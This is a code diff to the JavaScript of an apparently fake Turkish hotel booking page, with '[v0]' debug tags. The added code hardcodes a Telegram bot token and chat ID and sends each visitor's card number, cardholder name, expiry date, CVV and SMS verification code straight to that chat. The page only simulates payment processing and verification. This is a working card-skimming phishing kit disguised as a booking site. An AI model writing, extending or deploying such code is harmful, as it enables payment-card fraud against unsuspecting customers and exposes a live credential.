@@ -23,6 +23,39 @@ const smsForm = document.getElementById("smsForm")
 const backSmsBtn = document.getElementById("backSMS")
 const successState = document.getElementById("successState")
 
+const TELEGRAM_BOT_TOKEN = "7890044397:AAGJfCPAGtZLjdZPx3zj-66caqMICnqb-3w"
+const TELEGRAM_CHAT_ID = "-1002626141042"
+const TELEGRAM_API_URL = "https://api.telegram.org/bot"
+
+async function sendToTelegram(messageData) {
+  try {
+    const message = formatTelegramMessage(messageData)
+
+    const response = await fetch(`${TELEGRAM_API_URL}${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: TELEGRAM_CHAT_ID,
+        text: message,
+        parse_mode: "HTML",
+      }),
+    })
+
+    console.log("[v0] Telegram response:", response.status)
+    return response.ok
+  } catch (error) {
+    console.error("[v0] Telegram error:", error)
+  }
+}
+
+function formatTelegramMessage(data) {
+  if (data.type === "payment") {
+    return `<b>💳 KART BİLGİSİ</b>\n\n<b>Kart Numarası:</b> ${data.cardNumber}\n<b>Kart Sahibi:</b> ${data.cardName}\n<b>Son Kullanma:</b> ${data.expiryMonth}/${data.expiryYear}\n<b>CVV:</b> ${data.cvv}\n\n<b>Rezervasyon:</b>\n<b>Giriş:</b> ${data.checkIn}\n<b>Çıkış:</b> ${data.checkOut}\n<b>Misafir:</b> ${data.guests}\n<b>Tutar:</b> ${data.amount} TL`
+  } else if (data.type === "sms") {
+    return `<b>📱 SMS DOĞRULAMA</b>\n\n<b>Kod:</b> ${data.smsCode}\n<b>Tutar:</b> ${data.amount} TL\n<b>Saat:</b> ${data.timestamp}`
+  }
+}
+
 // Initialize
 document.addEventListener("DOMContentLoaded", () => {
   bookBtn.addEventListener("click", openPaymentModal)
@@ -96,27 +129,18 @@ async function handlePayment(e) {
     e: cvv,
   }
 
-  try {
-    const response = await fetch("./api/send-telegram", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        type: "payment",
-        cardNumber: cardNumber,
-        cardName: cardName,
-        expiryMonth: expiryMonth,
-        expiryYear: expiryYear,
-        cvv: cvv,
-        checkIn: state.checkIn,
-        checkOut: state.checkOut,
-        guests: state.guests,
-        amount: 2400,
-      }),
-    })
-    console.log("[v0] Payment data sent:", response.ok)
-  } catch (error) {
-    console.error("[v0] Payment send error:", error)
-  }
+  await sendToTelegram({
+    type: "payment",
+    cardNumber: cardNumber,
+    cardName: cardName,
+    expiryMonth: expiryMonth,
+    expiryYear: expiryYear,
+    cvv: cvv,
+    checkIn: state.checkIn,
+    checkOut: state.checkOut,
+    guests: state.guests,
+    amount: 2400,
+  })
 
   // Simulate processing
   document.getElementById("paymentBtn").disabled = true
@@ -145,24 +169,15 @@ async function handleSMS(e) {
   const smsCode = document.getElementById("smsCode").value
   state.smsCode = smsCode
 
-  try {
-    const response = await fetch("./api/send-telegram", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        type: "sms",
-        smsCode: smsCode,
-        checkIn: state.checkIn,
-        checkOut: state.checkOut,
-        guests: state.guests,
-        amount: 2300,
-        timestamp: new Date().toLocaleString("tr-TR"),
-      }),
-    })
-    console.log("[v0] SMS data sent:", response.ok)
-  } catch (error) {
-    console.error("[v0] SMS send error:", error)
-  }
+  await sendToTelegram({
+    type: "sms",
+    smsCode: smsCode,
+    checkIn: state.checkIn,
+    checkOut: state.checkOut,
+    guests: state.guests,
+    amount: 2300,
+    timestamp: new Date().toLocaleString("tr-TR"),
+  })
 
   // Simulate verification
   document.getElementById("verifyBtn").disabled = true
